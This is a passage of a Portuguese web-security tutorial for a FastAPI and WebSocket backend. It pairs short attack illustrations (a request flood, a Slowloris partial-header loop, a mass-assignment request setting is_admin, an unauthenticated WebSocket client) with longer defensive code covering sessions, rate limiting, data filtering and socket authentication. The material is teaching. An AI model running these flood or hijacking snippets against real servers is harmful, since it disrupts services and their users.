    # Definir cookie com SameSite=Strict
    response.set_cookie(
        key="refresh_token",
        value=refreshToken,
        httponly=True,      # Não acessível via JavaScript
        secure=True,        # Apenas HTTPS
        samesite="strict",  # CSRF protection
        max_age=604800      # 7 dias
    )
    
    return {"access_token": accessToken}
```

**Uso no cliente:**

```javascript
// 1. Obter CSRF token após login
async function login(username, password) {
  const loginResponse = await fetch('/api/login', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({username, password})
  });
  
  const {access_token} = await loginResponse.json();
  localStorage.setItem('jwt', access_token);
  
  // 2. Obter CSRF token
  const csrfResponse = await fetch('/api/csrf-token', {
    headers: {'Authorization': `Bearer ${access_token}`}
  });
  
  const {csrf_token} = await csrfResponse.json();
  localStorage.setItem('csrf_token', csrf_token);
}

// 3. Incluir CSRF token em todas requisições modificadoras
async function resetCounter() {
  const response = await fetch('/api/counter/reset', {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${localStorage.getItem('jwt')}`,
      'X-CSRF-Token': localStorage.getItem('csrf_token')  // ← Importante!
    }
  });
}
```

---

### 3.2 Session Fixation

**O que é:**
Atacante força vítima a usar session ID conhecido.

**Como acontece:**
```
1. Atacante obtém session ID válido: abc123
2. Atacante engana vítima para usar esse ID:
   https://noharm.app/login?session=abc123
3. Vítima faz login com esse session ID
4. Atacante usa abc123 e está logado como vítima!
```

**Prevenção:**

```python
# backend/security/sessionManager.py
import secrets
from datetime import datetime, timedelta
from typing import Optional, Dict

class SessionManager:
    """
    MEDIDA 1: Regenerar session ID após login
    """
    def __init__(self):
        self.sessions: Dict[str, dict] = {}
        self.sessionExpiry = timedelta(hours=24)
    
    def createSession(self, userId: str, deviceInfo: dict) -> str:
        """
        Cria nova sessão com ID único
        """
        # MEDIDA 2: Session ID criptograficamente seguro
        sessionId = secrets.token_urlsafe(32)
        
        self.sessions[sessionId] = {
            'user_id': userId,
            'device_info': deviceInfo,
            'created_at': datetime.utcnow(),
            'last_activity': datetime.utcnow(),
            'ip_address': deviceInfo.get('ip'),
            'user_agent': deviceInfo.get('user_agent')
        }
        
        return sessionId
    
    def regenerateSessionId(self, oldSessionId: str) -> Optional[str]:
        """
        MEDIDA 3: Regenera session ID (após login, mudança de privilégios)
        """
        if oldSessionId not in self.sessions:
            return None
        
        # Dados da sessão antiga
        sessionData = self.sessions[oldSessionId]
        
        # Remove sessão antiga
        del self.sessions[oldSessionId]
        
        # Cria nova sessão com mesmo dados mas novo ID
        newSessionId = secrets.token_urlsafe(32)
        self.sessions[newSessionId] = sessionData
        self.sessions[newSessionId]['regenerated_at'] = datetime.utcnow()
        
        return newSessionId
    
    def validateSession(self, sessionId: str, requestIp: str, userAgent: str) -> Optional[str]:
        """
        MEDIDA 4: Valida sessão com verificações de segurança
        """
        if sessionId not in self.sessions:
            return None
        
        session = self.sessions[sessionId]
        
        # Verifica expiração
        if datetime.utcnow() > session['created_at'] + self.sessionExpiry:
            del self.sessions[sessionId]
            return None
        
        # MEDIDA 5: Verifica mudança de IP (opcional, pode dar falso positivo)
        # if session['ip_address'] != requestIp:
        #     print(f"⚠️ IP mudou: {session['ip_address']} → {requestIp}")
        #     # Pode forçar re-autenticação
        
        # MEDIDA 6: Verifica mudança de User-Agent
        if session['user_agent'] != userAgent:
            print(f"⚠️ User-Agent mudou")
            # Possível session hijacking
        
        # Atualiza última atividade
        session['last_activity'] = datetime.utcnow()
        
        return session['user_id']
    
    def destroySession(self, sessionId: str):
        """Destroi sessão (logout)"""
        if sessionId in self.sessions:
            del self.sessions[sessionId]


sessionManager = SessionManager()

# Uso no login:
@router.post("/login")
async def login(request: Request, response: Response, username: str, password: str):
    # Autenticar usuário
    user = authenticateUser(username, password)
    if not user:
        raise HTTPException(status_code=401, detail="Credenciais inválidas")
    
    # Informações do dispositivo
    deviceInfo = {
        'ip': request.client.host,
        'user_agent': request.headers.get('User-Agent', '')
    }
    
    # MEDIDA 7: Criar NOVA sessão (nunca reusar)
    sessionId = sessionManager.createSession(user.id, deviceInfo)
    
    # Criar tokens JWT
    accessToken = jwtHandler.createAccessToken(userId=user.id)
    refreshToken = jwtHandler.createRefreshToken(userId=user.id)
    
    # Definir cookie de sessão
    response.set_cookie(
        key="session_id",
        value=sessionId,
        httponly=True,
        secure=True,
        samesite="strict",
        max_age=86400  # 24 horas
    )
    
    return {
        "access_token": accessToken,
        "refresh_token": refreshToken
    }
```

---

## 4. Ataques de Negação de Serviço (DoS/DDoS)

### 4.1 Application Layer DoS

**O que é:**
Atacante sobrecarrega servidor com requisições legítimas mas excessivas.

**Como acontece:**
```python
# Bot fazendo milhares de requisições:
while True:
    for i in range(1000):
        requests.get('https://noharm.app/api/users/profile')
        requests.post('https://noharm.app/api/messages/send', json={...})
    time.sleep(0.1)  # 10.000 req/seg
```

**Prevenção:**

```python
# backend/security/advancedRateLimiter.py
from collections import defaultdict
from datetime import datetime, timedelta
from typing import Tuple, Optional
import hashlib

class AdvancedRateLimiter:
    """
    Rate limiter com múltiplas estratégias
    """
    def __init__(self):
        # MEDIDA 1: Sliding Window por IP
        self.ipWindows = defaultdict(list)
        
        # MEDIDA 2: Sliding Window por usuário
        self.userWindows = defaultdict(list)
        
        # MEDIDA 3: Burst protection (picos súbitos)
        self.burstLimits = defaultdict(int)
        
        # MEDIDA 4: IP blacklist temporária
        self.blacklistedIps = {}
        
        # Configurações
        self.limitsPerMinute = {
            'ip': 60,           # 60 req/min por IP
            'user': 120,        # 120 req/min por usuário
            'burst': 10         # Máximo 10 req/seg
        }
        
        self.blacklistDuration = timedelta(hours=1)
    
    def checkRateLimit(
        self, 
        ip: str, 
        userId: Optional[str] = None,
        endpoint: str = None
    ) -> Tuple[bool, str]:
        """
        Verifica rate limits em múltiplas camadas
        Retorna: (permitido, motivo_bloqueio)
        """
        now = datetime.utcnow()
        
        # VERIFICAÇÃO 1: IP blacklisted?
        if ip in self.blacklistedIps:
            if now < self.blacklistedIps[ip]:
                remaining = int((self.blacklistedIps[ip] - now).total_seconds())
                return False, f"IP bloqueado por {remaining}s"
            else:
                del self.blacklistedIps[ip]
        
        # VERIFICAÇÃO 2: Burst protection (10 req/seg)
        burstKey = f"{ip}:{int(now.timestamp())}"
        self.burstLimits[burstKey] += 1
        
        if self.burstLimits[burstKey] > self.limitsPerMinute['burst']:
            # Bloqueia IP por 1 hora
            self.blacklistedIps[ip] = now + self.blacklistDuration
            print(f"🚨 IP bloqueado por burst: {ip}")
            return False, "Burst limit excedido"
        
        # VERIFICAÇÃO 3: Rate limit por IP (60/min)
        ipAllowed, ipRemaining = self._checkWindow(
            self.ipWindows[ip],
            self.limitsPerMinute['ip'],
            60  # janela de 1 minuto
        )
        
        if not ipAllowed:
            return False, f"Rate limit IP: {ipRemaining}s até próxima requisição"
        
        # VERIFICAÇÃO 4: Rate limit por usuário (120/min)
        if userId:
            userAllowed, userRemaining = self._checkWindow(
                self.userWindows[userId],
                self.limitsPerMinute['user'],
                60
            )
            
            if not userAllowed:
                return False, f"Rate limit usuário: {userRemaining}s"
        
        # VERIFICAÇÃO 5: Rate limit por endpoint (previne abuse de endpoints caros)
        if endpoint:
            endpointKey = f"{ip}:{endpoint}"
            endpointLimit = self._getEndpointLimit(endpoint)
            
            endpointAllowed, _ = self._checkWindow(
                self.ipWindows[endpointKey],
                endpointLimit,
                60
            )
            
            if not endpointAllowed:
                return False, f"Rate limit endpoint: {endpoint}"
        
        # Registra requisição
        self.ipWindows[ip].append(now)
        if userId:
            self.userWindows[userId].append(now)
        
        return True, ""
    
    def _checkWindow(
        self, 
        window: list, 
        maxRequests: int, 
        windowSeconds: int
    ) -> Tuple[bool, int]:
        """
        Sliding window algorithm
        """
        now = datetime.utcnow()
        cutoff = now - timedelta(seconds=windowSeconds)
        
        # Remove requisições antigas
        window[:] = [ts for ts in window if ts > cutoff]
        
        # Verifica limite
        if len(window) >= maxRequests:
            # Calcula quando próxima requisição será permitida
            oldestRequest = min(window)
            nextAllowed = oldestRequest + timedelta(seconds=windowSeconds)
            remaining = int((nextAllowed - now).total_seconds())
            
            return False, remaining
        
        return True, 0
    
    def _getEndpointLimit(self, endpoint: str) -> int:
        """
        MEDIDA 6: Limites diferentes por endpoint
        """
        expensiveEndpoints = {
            '/api/users/search': 10,      # Busca: 10/min
            '/api/reports/generate': 5,   # Relatórios: 5/min
            '/api/export/data': 2         # Export: 2/min
        }
        
        return expensiveEndpoints.get(endpoint, 60)  # Default: 60/min
    
    def cleanupOldData(self):
        """
        MEDIDA 7: Limpeza periódica de dados antigos
        Chamar a cada 5 minutos
        """
        now = datetime.utcnow()
        cutoff = now - timedelta(minutes=5)
        
        # Limpa burst limits antigos
        oldBurstKeys = [
            k for k, v in self.burstLimits.items()
            if int(k.split(':')[1]) < int(cutoff.timestamp())
        ]
        for key in oldBurstKeys:
            del self.burstLimits[key]
        
        # Limpa windows vazias
        self.ipWindows = defaultdict(
            list,
            {k: v for k, v in self.ipWindows.items() if v}
        )
        self.userWindows = defaultdict(
            list,
            {k: v for k, v in self.userWindows.items() if v}
        )


# Middleware de Rate Limiting:
rateLimiter = AdvancedRateLimiter()

class RateLimitMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        # Obter IP
        clientIp = request.client.host
        
        # Obter userId se autenticado
        userId = None
        authHeader = request.headers.get('Authorization', '')
        if authHeader.startswith('Bearer '):
            token = authHeader[7:]
            payload = jwtHandler.verifyToken(token)
            if payload:
                userId = payload['sub']
        
        # Verificar rate limit
        allowed, reason = rateLimiter.checkRateLimit(
            ip=clientIp,
            userId=userId,
            endpoint=request.url.path
        )
        
        if not allowed:
            # MEDIDA 8: Header Retry-After
            response = JSONResponse(
                status_code=429,
                content={"error": "Rate limit excedido", "detail": reason}
            )
            response.headers['Retry-After'] = '60'  # Tentar novamente em 60s
            return response
        
        response = await call_next(request)
        
        # MEDIDA 9: Informar limites nos headers
        response.headers['X-RateLimit-Limit'] = '60'
        response.headers['X-RateLimit-Remaining'] = str(
            60 - len(rateLimiter.ipWindows[clientIp])
        )
        
        return response
```

---

### 4.2 Slowloris Attack

**O que é:**
Atacante abre muitas conexões e as mantém abertas lentamente.

**Como acontece:**
```python
# Atacante abre 1000 conexões
for i in range(1000):
    sock = socket.socket()
    sock.connect(('noharm.app', 443))
    
    # Envia header parcial
    sock.send(b"GET / HTTP/1.1\r\n")
    
    # Espera... envia mais um pouco
    time.sleep(10)
    sock.send(b"Host: noharm.app\r\n")
    
    # Nunca completa requisição
    # Servidor fica esperando...
```

**Prevenção:**

```python
# backend/main.py
from fastapi import FastAPI
import uvicorn

app = FastAPI()

# MEDIDA 1: Configuração do servidor Uvicorn
if __name__ == "__main__":
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=8000,
        
        # Timeouts contra Slowloris
        timeout_keep_alive=5,       # Fecha conexão idle após 5s
        timeout_graceful_shutdown=10,
        
        # Limites de conexão
        limit_concurrency=1000,     # Máximo 1000 conexões simultâneas
        limit_max_requests=10000,   # Reinicia worker após 10k requisições
        
        # Limites de tamanho
        h11_max_incomplete_event_size=16384,  # 16KB header máximo
    )


# MEDIDA 2: Nginx como proxy reverso (recomendado)
# nginx.conf
"""
server {
    listen 443 ssl;
    server_name noharm.app;
    
    # Proteção contra Slowloris
    client_body_timeout 10s;     # Timeout para corpo da requisição
    client_header_timeout 10s;   # Timeout para headers
    keepalive_timeout 5s;        # Timeout de keep-alive
    send_timeout 10s;            # Timeout de envio
    
    # Limites de tamanho
    client_max_body_size 1m;     # Máximo 1MB de body
    client_header_buffer_size 1k;
    large_client_header_buffers 2 1k;
    
    # Rate limiting no Nginx
    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
    limit_req zone=api burst=20 nodelay;
    
    # Proxy para FastAPI
    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        
        # Timeouts de proxy
        proxy_connect_timeout 5s;
        proxy_send_timeout 10s;
        proxy_read_timeout 10s;
    }
}
"""
```

---

## 5. Ataques de Dados

### 5.1 Data Exposure (Exposição de Dados)

**O que é:**
Dados sensíveis vazam através de APIs, logs ou erros.

**Como acontece:**
```python
# Código VULNERÁVEL ❌
@router.get("/users/{user_id}")
async def getUser(userId: str):
    user = database.getUserById(userId)
    
    # Retorna TUDO, incluindo dados sensíveis
    return user  # {id, username, email, password_hash, ssn, credit_card, ...}


# Logs VULNERÁVEIS ❌
logger.info(f"User logged in: {user.email}, password: {password}")
# Senha em texto plano no log! 🚨
```

**Prevenção:**

```python
# backend/models/userModel.py
from pydantic import BaseModel, EmailStr, Field
from typing import Optional
from datetime import datetime

class UserInDB(BaseModel):
    """
    Modelo COMPLETO (nunca retornar isto ao cliente!)
    """
    id: str
    username: str
    email: EmailStr
    password_hash: str              # ← SENSÍVEL
    phone: Optional[str]
    created_at: datetime
    last_login: Optional[datetime]
    reset_token: Optional[str]      # ← SENSÍVEL
    mfa_secret: Optional[str]       # ← SENSÍVEL
    
    class Config:
        orm_mode = True


class UserPublicProfile(BaseModel):
    """
    MEDIDA 1: Modelo público (apenas dados não-sensíveis)
    """
    id: str
    username: str
    created_at: datetime
    
    # NÃO inclui: email, password_hash, phone, tokens


class UserPrivateProfile(BaseModel):
    """
    MEDIDA 2: Modelo privado (próprio usuário)
    """
    id: str
    username: str
    email: EmailStr
    phone: Optional[str]
    created_at: datetime
    last_login: Optional[datetime]
    
    # NÃO inclui: password_hash, reset_token, mfa_secret


class UserSafeUpdate(BaseModel):
    """
    MEDIDA 3: Modelo para atualizações (whitelist de campos)
    """
    username: Optional[str] = Field(None, min_length=3, max_length=30)
    phone: Optional[str] = Field(None, regex=r'^\+?[1-9]\d{1,14}$')
    
    # NÃO permite atualizar: id, email, password (precisam de endpoints separados)


# Uso nas rotas:
@router.get("/users/{user_id}", response_model=UserPublicProfile)
async def getUserProfile(userId: str):
    """
    MEDIDA 4: response_model filtra automaticamente
    """
    user = database.getUserById(userId)
    
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    # Retorna usuário COMPLETO mas FastAPI filtra para UserPublicProfile
    return user


@router.get("/me", response_model=UserPrivateProfile)
async def getMyProfile(currentUserId: str = Depends(getCurrentUser)):
    """
    Perfil privado - mais informações
    """
    user = database.getUserById(currentUserId)
    return user


@router.put("/me", response_model=UserPrivateProfile)
async def updateMyProfile(
    updates: UserSafeUpdate,
    currentUserId: str = Depends(getCurrentUser)
):
    """
    MEDIDA 5: Whitelist de campos atualizáveis
    """
    # Apenas campos em UserSafeUpdate podem ser atualizados
    updatedUser = database.updateUser(currentUserId, updates.dict(exclude_unset=True))
    return updatedUser


# MEDIDA 6: Sanitização de logs
class SafeLogger:
    """Logger que remove dados sensíveis"""
    
    SENSITIVE_FIELDS = {'password', 'token', 'secret', 'api_key', 'credit_card', 'ssn'}
    
    def sanitize(self, data: dict) -> dict:
        """Remove campos sensíveis"""
        if not isinstance(data, dict):
            return data
        
        sanitized = {}
        for key, value in data.items():
            if key.lower() in self.SENSITIVE_FIELDS:
                sanitized[key] = '***REDACTED***'
            elif isinstance(value, dict):
                sanitized[key] = self.sanitize(value)
            else:
                sanitized[key] = value
        
        return sanitized
    
    def info(self, message: str, data: dict = None):
        """Log seguro"""
        if data:
            sanitized = self.sanitize(data)
            logger.info(f"{message}: {sanitized}")
        else:
            logger.info(message)


safeLogger = SafeLogger()

# Uso:
safeLogger.info("User logged in", {
    "user_id": user.id,
    "email": user.email,
    "password": "secret123"  # Será redacted
})
# Output: User logged in: {'user_id': '123', 'email': 'user@email.com', 'password': '***REDACTED***'}
```

---

### 5.2 Mass Assignment

**O que é:**
Atacante envia campos extras que não deveria poder modificar.

**Como acontece:**
```python
# Código VULNERÁVEL ❌
@router.put("/users/update")
async def updateUser(userId: str, **kwargs):
    # Aceita QUALQUER campo
    database.updateUser(userId, kwargs)

# Atacante envia:
PUT /users/update
{
  "username": "hacker",
  "is_admin": true,        ← Campo que não deveria modificar!
  "account_balance": 1000000
}
```

**Prevenção:**

```python
# backend/routes/userRoutes.py
from pydantic import BaseModel, validator
from typing import Optional

class UserUpdateRequest(BaseModel):
    """
    MEDIDA 1: Whitelist explícita de campos
    """
    username: Optional[str]
    bio: Optional[str]
    avatar_url: Optional[str]
    
    # NÃO permite: is_admin, account_balance, email, etc
    
    @validator('username')
    def validateUsername(cls, v):
        if v is not None:
            if len(v) < 3 or len(v) > 30:
                raise ValueError('Username deve ter 3-30 caracteres')
            if not re.match(r'^[a-zA-Z0-9_-]+$', v):
                raise ValueError('Username inválido')
        return v


@router.put("/users/me")
async def updateProfile(
    updates: UserUpdateRequest,  # ← Apenas campos permitidos
    currentUserId: str = Depends(getCurrentUser)
):
    """
    MEDIDA 2: Pydantic rejeita campos extras automaticamente
    """
    # Apenas campos definidos em UserUpdateRequest são aceitos
    updatedUser = database.updateUser(
        currentUserId,
        updates.dict(exclude_unset=True)  # Só campos enviados
    )
    
    return updatedUser


# MEDIDA 3: Campos sensíveis em endpoints separados
class EmailChangeRequest(BaseModel):
    new_email: EmailStr
    password: str  # Requer senha atual
    
    @validator('new_email')
    def validateEmail(cls, v, values):
        # Validações adicionais
        if '+' in v:
            raise ValueError('Email com + não permitido')
        return v


@router.put("/users/email")
async def changeEmail(
    request: EmailChangeRequest,
    currentUserId: str = Depends(getCurrentUser)
):
    """
    Mudança de email requer autenticação separada
    """
    user = database.getUserById(currentUserId)
    
    # MEDIDA 4: Requer senha atual
    if not bcrypt.checkpw(request.password.encode(), user.password_hash.encode()):
        raise HTTPException(status_code=401, detail="Senha incorreta")
    
    # MEDIDA 5: Verificação de email
    verificationToken = secrets.token_urlsafe(32)
    sendEmailVerification(request.new_email, verificationToken)
    
    # Salva token temporariamente
    database.savePendingEmailChange(currentUserId, request.new_email, verificationToken)
    
    return {"message": "Email de verificação enviado"}


# MEDIDA 6: Auditoria de mudanças sensíveis
class AuditLog:
    @staticmethod
    def logSensitiveChange(userId: str, field: str, oldValue: str, newValue: str):
        database.saveAuditLog({
            'user_id': userId,
            'action': 'field_change',
            'field': field,
            'old_value': oldValue if field != 'password' else '***',
            'new_value': newValue if field != 'password' else '***',
            'timestamp': datetime.utcnow(),
            'ip_address': get_current_ip()
        })


@router.put("/users/password")
async def changePassword(
    oldPassword: str,
    newPassword: str,
    currentUserId: str = Depends(getCurrentUser)
):
    """Mudança de senha com auditoria"""
    user = database.getUserById(currentUserId)
    
    # Verificar senha antiga
    if not bcrypt.checkpw(oldPassword.encode(), user.password_hash.encode()):
        # MEDIDA 7: Log de tentativa falha
        AuditLog.logSensitiveChange(currentUserId, 'password', 'N/A', 'FAILED_ATTEMPT')
        raise HTTPException(status_code=401, detail="Senha incorreta")
    
    # MEDIDA 8: Validar força da nova senha
    if len(newPassword) < 8:
        raise HTTPException(status_code=400, detail="Senha muito curta")
    
    # Hash nova senha
    newHash = bcrypt.hashpw(newPassword.encode(), bcrypt.gensalt(rounds=12))
    
    # Atualizar
    database.updateUserPassword(currentUserId, newHash.decode())
    
    # MEDIDA 9: Revogar todos tokens existentes
    database.revokeAllRefreshTokens(currentUserId)
    
    # Log de sucesso
    AuditLog.logSensitiveChange(currentUserId, 'password', '***', 'CHANGED')
    
    return {"message": "Senha alterada com sucesso. Faça login novamente."}
```

---

## 6. Ataques de WebSocket

### 6.1 WebSocket Hijacking

**O que é:**
Atacante intercepta ou injeta mensagens WebSocket.

**Como acontece:**
```javascript
// Atacante cria WebSocket sem autenticação
const ws = new WebSocket('wss://noharm.app/socket');

ws.onopen = () => {
  // Tenta enviar mensagem
  ws.send(JSON.stringify({
    type: 'message',
    recipient: 'user123',
    content: 'Mensagem maliciosa'
  }));
};
```

**Prevenção:**

```python
# backend/websocket/socketManager.py
import socketio
from typing import Dict, Set, Optional
from datetime import datetime, timedelta

class SocketManager:
    def __init__(self, jwtHandler: JwtHandler):
        self.sio = socketio.AsyncServer(
            async_mode='asgi',
            cors_allowed_origins=[
                'https://noharm.app',
                'https://www.noharm.app'
            ],  # MEDIDA 1: Whitelist de origens
            ping_timeout=60,
            ping_interval=25,
            max_http_buffer_size=102400,  # MEDIDA 2: 100KB máximo
            logger=True,
            engineio_logger=True
        )
        
        self.jwtHandler = jwtHandler
        self.connectedUsers: Dict[str, Set[str]] = {}  # userId -> {sid1, sid2}
        self.sidToUser: Dict[str, str] = {}             # sid -> userId
        self.messageRateLimits: Dict[str, list] = {}    # userId -> [timestamps]
        
        self.setupHandlers()
    
    def setupHandlers(self):
        """Configura event handlers"""
        
        @self.sio.event
        async def connect(sid, environ):
            """
            MEDIDA 3: Autenticação obrigatória na conexão
            """
            try:
                userId = await self.authenticate(sid, environ)
                
                if not userId:
                    print(f"⚠️ Conexão rejeitada: autenticação falhou")
                    return False  # Rejeita conexão
                
                # MEDIDA 4: Registra conexão
                await self.registerConnection(userId, sid, environ)
                
                print(f"✅ Conexão estabelecida: {userId}")
                return True
                
            except Exception as e:
                print(f"🚨 Erro na conexão: {str(e)}")
                return False
        
        @self.sio.event
        async def disconnect(sid):
            """Limpa conexão"""
            if sid in self.sidToUser:
                userId = self.sidToUser[sid]
                await self.unregisterConnection(userId, sid)
                print(f"👋 Desconectado: {userId}")
        
        @self.sio.event
        async def message(sid, data):
            """
            MEDIDA 5: Validação de mensagens
            """
            try:
                # Verifica se está autenticado
                if sid not in self.sidToUser:
                    await self.sio.emit('error', {
                        'message': 'Não autenticado'
                    }, room=sid)
                    return
                
                userId = self.sidToUser[sid]
                
                # MEDIDA 6: Rate limiting por usuário
                if not await self.checkMessageRateLimit(userId):
                    await self.sio.emit('error', {
                        'message': 'Muitas mensagens. Aguarde um momento.'
                    }, room=sid)
                    return
                
                # MEDIDA 7: Validação de dados
                validated = self.validateMessage(data)
                
                # MEDIDA 8: Sanitização
                sanitized = self.sanitizeMessage(validated)
                
                # MEDIDA 9: Verificar que destinatário existe
                if not database.userExists(sanitized['recipient_id']):
                    await self.sio.emit('error', {
                        'message': 'Destinatário não encontrado'
                    }, room=sid)
                    return
                
                # Processar mensagem
                await self.handleMessage(userId, sanitized)
                
            except ValueError as e:
                await self.sio.emit('error', {
                    'message': str(e)
                }, room=sid)
            except Exception as e:
                print(f"🚨 Erro ao processar mensagem: {str(e)}")
                await self.sio.emit('error', {
                    'message': 'Erro ao processar mensagem'
                }, room=sid)
    
    async def authenticate(self, sid: str, environ: dict) -> Optional[str]:
        """
        Autentica conexão WebSocket
        """
        try:
            # MEDIDA 10: Extrai token JWT
            token = self.extractToken(environ)
            
            if not token:
                return None
            
            # Verifica token
            payload = self.jwtHandler.verifyToken(token, 'access')
            
            if not payload:
                return None
            
            userId = payload['sub']
            
            # MEDIDA 11: Verifica IP blacklist
            clientIp = self.getClientIp(environ)
            if await self.isIpBlacklisted(clientIp):
                print(f"🚨 IP bloqueado tentou conectar: {clientIp}")
                return None
            
            return userId
            
        except Exception as e:
            print(f"Erro na autenticação WebSocket: {e}")
            return None
    
    def extractToken(self, environ: dict) -> Optional[str]:
        """Extrai JWT da conexão"""
        # Tenta do header Authorization
        auth = environ.get('HTTP_AUTHORIZATION', '')
        if auth.startswith('Bearer '):
            return auth[7:]
        
        # Tenta da query string
        query = environ.get('QUERY_STRING', '')
        if 'token=' in query:
            for param in query.split('&'):
                if param.startswith('token='):
                    return param[6:]
        
        return None
    
    def getClientIp(self, environ: dict) -> str:
        """Obtém IP real do cliente"""
        # MEDIDA 12: Suporta proxies
        forwarded = environ.get('HTTP_X_FORWARDED_FOR')
        if forwarded:
            return forwarded.split(',')[0].strip()
        
        real_ip = environ.get('HTTP_X_REAL_IP')
        if real_ip:
            return real_ip
        
        return environ.get('REMOTE_ADDR', 'unknown')
    
    async def registerConnection(self, userId: str, sid: str, environ: dict):
        """Registra conexão"""
        # MEDIDA 13: Limita conexões simultâneas
        if userId not in self.connectedUsers:
            self.connectedUsers[userId] = set()
        
        # Máximo 5 dispositivos
        if len(self.connectedUsers[userId]) >= 5:
            # Desconecta o mais antigo
            oldest = list(self.connectedUsers[userId])[0]
            await self.sio.disconnect(oldest)
            self.connectedUsers[userId].remove(oldest)
            if oldest in self.sidToUser:
                del self.sidToUser[oldest]
        
        # Adiciona nova conexão
        self.connectedUsers[userId].add(sid)
        self.sidToUser[sid] = userId
        
        # Log de conexão
        clientIp = self.getClientIp(environ)
        userAgent = environ.get('HTTP_USER_AGENT', '')
        
        print(f"📱 Nova conexão: {userId} | IP: {clientIp} | UA: {userAgent[:50]}")
    
    async def unregisterConnection(self, userId: str, sid: str):
        """Remove conexão"""
        if userId in self.connectedUsers:
            self.connectedUsers[userId].discard(sid)
            
            if not self.connectedUsers[userId]:
                del self.connectedUsers[userId]
        
        if sid in self.sidToUser:
            del self.sidToUser[sid]
    
    async def checkMessageRateLimit(self, userId: str) -> bool:
        """
        MEDIDA 14: Rate limiting de mensagens
        """
        now = datetime.utcnow()
        
        if userId not in self.messageRateLimits:
            self.messageRateLimits[userId] = []
        
        # Remove mensagens antigas (> 1 minuto)
        cutoff = now - timedelta(minutes=1)
        self.messageRateLimits[userId] = [
            ts for ts in self.messageRateLimits[userId]
            if ts > cutoff
        ]
        
        # Limita a 20 mensagens por minuto
        if len(self.messageRateLimits[userId]) >= 20:
            return False
        
        self.messageRateLimits[userId].append(now)
        return True
    
    def validateMessage(self, data: dict) -> dict:
        """
        MEDIDA 15: Validação rigorosa
        """
        if not isinstance(data, dict):
            raise ValueError("Mensagem deve ser objeto")
        
        # Campos obrigatórios
        required = ['type', 'content']
        for field in required:
            if field not in data:
                raise ValueError(f"Campo obrigatório: {field}")
        
        # Valida tipo
        allowedTypes = ['chat_message', 'typing', 'read_receipt']
        if data['type'] not in allowedTypes:
            raise ValueError(f"Tipo inválido: {data['type']}")
        
        return data
    
    def sanitizeMessage(self, data: dict) -> dict:
        """
        MEDIDA 16: Sanitização
        """
        from security.sanitizer import InputSanitizer
        sanitizer = InputSanitizer()
        
        return {
            'type': data['type'],
            'content': sanitizer.sanitizeHtml(str(data.get('content', ''))),
            'recipient_id': sanitizer.sanitizeId(str(data.get('recipient_id', '')))
        }
    
    async def handleMessage(self, senderId: str, message: dict):
        """Processa e envia mensagem"""
        recipientId = message['recipient_id']
        
        # Salva no banco
        messageId = database.saveMessage({
            'sender_id': senderId,
            'recipient_id': recipientId,
            'content': message['content'],
            'type': message['type'],
            'created_at': datetime.utcnow()
        })
        
        # MEDIDA 17: Envia apenas para destinatário
        if recipientId in self.connectedUsers:
            # Emite para todas sessões do destinatário
            for sid in self.connectedUsers[recipientId]:
                await self.sio.emit('new_message', {
                    'id': messageId,
                    'sender_id': senderId,
                    'content': message['content'],
                    'created_at': datetime.utcnow().isoformat()
                }, room=sid)
    
    async def isIpBlacklisted(self, ip: str) -> bool:
        """Verifica se IP está bloqueado"""
        # TODO: Implementar com Redis
        return False
```

**Configuração do cliente:**

```javascript
// frontend/socket.js

class SecureSocketClient {
  constructor() {
    this.socket = null;
    this.reconnectAttempts = 0;
    this.maxReconnectAttempts = 5;
  }
  
  connect(token) {
    // MEDIDA 18: Sempre usar WSS (WebSocket Secure)
    const wsUrl = 'wss://noharm.app/socket';
    
    this.socket = io(wsUrl, {
      auth: {
        token: token  // JWT token
      },
      transports: ['websocket'],  // Apenas WebSocket (não polling)
      reconnection: true,
      reconnectionAttempts: this.maxReconnectAttempts,
      reconnectionDelay: 1000,
      timeout: 20000
    });
    
    this.setupHandlers();
  }
  
  setupHandlers() {
    this.socket.on('connect', () => {
      console.log('✅ Conectado ao WebSocket');
      this.reconnectAttempts = 0;
    });
    
    this.socket.on('disconnect', (reason) => {
      console.log('⚠️ Desconectado:', reason);
      
      // MEDIDA 19: Não reconectar automaticamente se token expirou
      if (reason === 'io server disconnect') {
        // Servidor forçou desconexão (provável token inválido)
        // Não tentar reconectar
        this.socket.disconnect();
      }
    });
    
    this.socket.on('error', (error) => {
      console.error('🚨 Erro WebSocket:', error);
    });
    
    this.socket.on('new_message', (message) => {
      // MEDIDA 20: Validar mensagens recebidas
      if (this.isValidMessage(message)) {
        this.handleNewMessage(message);
      }
    });
  }
  
  isValidMessage(message) {
    // MEDIDA 21: Validação client-side (defesa em profundidade)
    return (
      message &&
      typeof message === 'object' &&
      typeof message.id === 'string' &&
      typeof message.content === 'string' &&
      message.content.length <= 2000
    );
  }
  
  sendMessage(recipientId, content) {
    // MEDIDA 22: Validação antes de enviar
    if (!recipientId || !content) {
      throw new Error('Dados inválidos');
    }
    
    if (content.length > 2000) {
      throw new Error('Mensagem muito longa');
    }
    
    this.socket.emit('message', {
      type: 'chat_message',
      recipient_id: recipientId,
      content: content
    });
  }
  
  disconnect() {
    if (this.socket) {
      this.socket.disconnect();
    }
  }
}
```

---

## 7. Configuração Completa

### 7.1 Estrutura do Projeto

```
backend/
├── main.py                 # Aplicação principal
├── config.py               # Configurações
├── requirements.txt        # Dependências
│
├── security/
│   ├── jwtHandler.py
│   ├── rateLimiter.py
│   ├── sanitizer.py
│   ├── encryption.py
│   └── middleware.py
│
├── database/
│   ├── models.py
│   ├── userRepository.py
│   └── messageRepository.py
│
├── routes/
│   ├── auth.py
│   ├── users.py
│   └── messages.py
│
└── websocket/
    └── socketManager.py
```

### 7.2 Arquivo Principal

```python
# backend/main.py
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
import socketio

# Imports locais
from security.middleware import SecurityHeadersMiddleware, RateLimitMiddleware, CsrfMiddleware
from security.jwtHandler import JwtHandler
from websocket.socketManager import SocketManager
from routes import auth, users, messages
from config import settings

# Criar aplicação FastAPI
app = FastAPI(
    title="NoHarm API",
    description="API segura para aplicativo de recuperação",
